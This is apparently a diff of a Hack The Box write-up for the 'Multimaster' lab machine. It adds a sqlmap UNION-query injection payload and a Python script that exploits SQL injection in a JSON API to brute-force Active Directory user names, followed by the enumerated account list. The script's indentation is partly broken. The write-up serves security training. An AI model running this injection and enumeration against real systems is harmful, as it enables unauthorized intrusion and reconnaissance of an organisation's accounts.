@@ -225,6 +225,12 @@ Parameter: JSON name ((custom) POST)
     Type: time-based blind
     Title: Microsoft SQL Server/Sybase time-based blind (IF)
     Payload: {&#34;name&#34;:&#34;\u27&#39; WAITFOR DELAY &#39;0:0:5&#39;-- Wvdt&#34;}
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: {&#34;name&#34;:&#34;test&#39; UNION ALL SELECT 58,58,58,CHAR(113)+CHAR(112)+CHAR(122)+CHAR(107)+CHAR(113)+CHAR(68)+CHAR(105)+CHAR(69)+CHAR(119)+CHAR(71)+CHAR(98)+CHAR(76)+CHAR(83)+CHAR(102)+CHAR(68)+CHAR(114)+CHAR(73)+CHAR(109)+CHAR(73)+CH
+AR(98)+CHAR(101)+CHAR(116)+CHAR(99)+CHAR(70)+CHAR(80)+CHAR(103)+CHAR(101)+CHAR(86)+CHAR(113)+CHAR(73)+CHAR(82)+CHAR(103)+CHAR(90)+CHAR(115)+CHAR(114)+CHAR(76)+CHAR(73)+CHAR(77)+CHAR(105)+CHAR(103)+CHAR(73)+CHAR(71)+CHAR(67)+CHAR(83)+CHAR
+(111)+CHAR(113)+CHAR(98)+CHAR(120)+CHAR(98)+CHAR(113),58-- gxQm&#34;}
 ---
 [15:57:00] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
 [15:57:00] [INFO] testing Microsoft SQL Server
@@ -330,6 +336,114 @@ SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\kpage:fin
 SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\kpage:banking1 STATUS_LOGON_FAILURE 
 SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\shayna:password1 STATUS_LOGON_FAILURE
 ...
+</code></pre><ul><li>There is a way for us to dump domain users<ul><li><a href=https://keramas.github.io/2020/03/22/mssql-ad-enumeration.html target=_blank rel=noopener>https://keramas.github.io/2020/03/22/mssql-ad-enumeration.html</a></li><li><a href=https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/ target=_blank rel=noopener>https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/</a></li><li>Below is the script that does that</li><li>But before that we have to know:<ul><li>The name of the domain: <code>MEGACORP.LOCAL</code> or <code>default_domain()</code></li><li><code>SID</code> of the domain using <code>select sys.fn_varbintohexstr(SUSER_SID('MEGACORP.LOCAL\Administrator'))</code></li><li>Then we bruteforce <code>RID</code>s to get <code>AD</code> users</li></ul></li><li>We will use the payload from the <code>sqlmap</code><ul><li><code>test' UNION ALL SELECT 58,58,58,{},58-- -</code></li></ul></li><li>The response will be in the form of <code>[{"id":58,"name":"58","position":"58","email":"","src":"58"}]</code><ul><li>Where <code>email</code> will contain the result of the query</li></ul></li></ul></li></ul><pre tabindex=0><code>import sys
+import time
+import struct
+import binascii
+import requests
+
+URL = &#34;http://10.10.10.179/api/getColleagues&#34;
+HEADERS = {&#34;Content-Type&#34;: &#34;application/json;charset=utf-8&#34;}
+PAYLOAD = &#34;&#34;&#34;test&#39; UNION ALL SELECT 58,58,58,{},58-- -&#34;&#34;&#34;
+PROXY = {&#34;http&#34;: &#34;http://127.0.0.1:8080&#34;}
+
+def unicode_convert(data):
+	payload = &#34;&#34;
+	
+	for char in data:
+		payload += r&#34;\u{:04x}&#34;.format(ord(char))
+	return payload
+
+def perform_query(query):
+
+	data = &#39;{&#34;name&#34;:&#34;&#39; + unicode_convert(PAYLOAD.format(query)) + &#39;&#34;}&#39;
+	r = requests.post(URL, headers = HEADERS, data = data, proxies = PROXY)
+	
+	return r.json()[0][&#34;email&#34;]
+
+def bruteforce(sid):
+	for i in range(500, 5000):
+		rid = binascii.hexlify(struct.pack(&#34;&lt;I&#34;, i)).decode()
+		query = f&#34;SUSER_SNAME({sid}{rid})&#34;	
+		user = perform_query(query)
+    if user:
+		  print(f&#34;[+] User: {user}&#34;)
+		time.sleep(10)
+	return 0
+
+if __name__ == &#34;__main__&#34;:
+	
+	print(&#34;[*] Gathering required information for attack&#34;)
+	print(&#34;[*] Step 1: Domain name&#34;)
+	domain = perform_query(&#34;DEFAULT_DOMAIN()&#34;)
+	print(f&#34;[+] Domain name: {domain}&#34;)
+	
+	print(&#34;[*] Step 2: Domain SID&#34;)
+	sid = perform_query(f&#34;sys.fn_varbintohexstr(SUSER_SID(&#39;{domain}\Administrator&#39;))&#34;)[:-8]
+	print(f&#34;[+] Domain SID: {sid}&#34;)
+
+	print(f&#34;[*] Starting domain user bruteforce for {domain} domain: {sid}&#34;)
+	bruteforce(sid)
+	
+	print()
+</code></pre><ul><li>The script will take more</li></ul><pre tabindex=0><code>└─$ python3 mssql-domain-user-bruteforcer.py
+[*] Gathering required information for attack
+[*] Step 1: Domain name
+[+] Domain name: MEGACORP
+[*] Step 2: Domain SID
+[+] Domain SID: 0x0105000000000005150000001c00d1bcd181f1492bdfc236
+[*] Starting domain user bruteforce for MEGACORP domain: 0x0105000000000005150000001c00d1bcd181f1492bdfc236
+[+] User: MEGACORP\Administrator                              
+[+] User: MEGACORP\Guest                              
+[+] User: MEGACORP\krbtgt                              
+[+] User: MEGACORP\DefaultAccount                              
+[+] User: MEGACORP\Domain Admins                              
+[+] User: MEGACORP\Domain Users                              
+[+] User: MEGACORP\Domain Guests                              
+[+] User: MEGACORP\Domain Computers                              
+[+] User: MEGACORP\Domain Controllers                              
+[+] User: MEGACORP\Cert Publishers                              
+[+] User: MEGACORP\Schema Admins                              
+[+] User: MEGACORP\Enterprise Admins                              
+[+] User: MEGACORP\Group Policy Creator Owners                              
+[+] User: MEGACORP\Read-only Domain Controllers                              
+[+] User: MEGACORP\Cloneable Domain Controllers                              
+[+] User: MEGACORP\Protected Users                              
+[+] User: MEGACORP\Key Admins                              
+[+] User: MEGACORP\Enterprise Key Admins                              
+[+] User: MEGACORP\RAS and IAS Servers                              
+[+] User: MEGACORP\Allowed RODC Password Replication Group                              
+[+] User: MEGACORP\Denied RODC Password Replication Group                              
+[+] User: MEGACORP\MULTIMASTER$                              
+[+] User: MEGACORP\DnsAdmins                              
+[+] User: MEGACORP\DnsUpdateProxy                              
+[+] User: MEGACORP\svc-nas                              
+[+] User: MEGACORP\Privileged IT Accounts                              
+[+] User: MEGACORP\tushikikatomo                              
+[+] User: MEGACORP\andrew                              
+[+] User: MEGACORP\lana                               
+[+] User: MEGACORP\alice                              
+[+] User: MEGACORP\test                               
+[+] User: MEGACORP\dai                                
+[+] User: MEGACORP\svc-sql                              
+[+] User: MEGACORP\SQLServer2005SQLBrowserUser$MULTIMASTER                              
+[+] User: MEGACORP\sbauer                              
+[+] User: MEGACORP\okent                              
+[+] User: MEGACORP\ckane                              
+[+] User: MEGACORP\kpage                              
+[+] User: MEGACORP\james                              
+[+] User: MEGACORP\cyork                              
+[+] User: MEGACORP\rmartin                              
+[+] User: MEGACORP\zac                                
+[+] User: MEGACORP\jorden                              
+[+] User: MEGACORP\alyx                               
+[+] User: MEGACORP\ilee                               
+[+] User: MEGACORP\nbourne                              
+[+] User: MEGACORP\zpowers                              
+[+] User: MEGACORP\aldom                              
+[+] User: MEGACORP\jsmmons                              
+[+] User: MEGACORP\pmartin                              
+[+] User: MEGACORP\Developers
 </code></pre><h2 id=user>User</h2><h2 id=root>Root</h2></div><div class="row pl-3 pr-3"><div class="col-md-6 share-buttons"><strong>Share on:</strong>
 <a class="btn btn-sm twitter-btn" href="https://twitter.com/share?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2fwindows%2fmultimaster%2f&text=%5bHTB%5d%20Machine%3a%20Multimaster&via=Personal%20Blog" target=_blank><i class="fab fa-twitter"></i></a>
 <a class="btn btn-sm reddit-btn" href="https://reddit.com/submit?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2fwindows%2fmultimaster%2f&title=%5bHTB%5d%20Machine%3a%20Multimaster" target=_blank><i class="fab fa-reddit"></i></a>
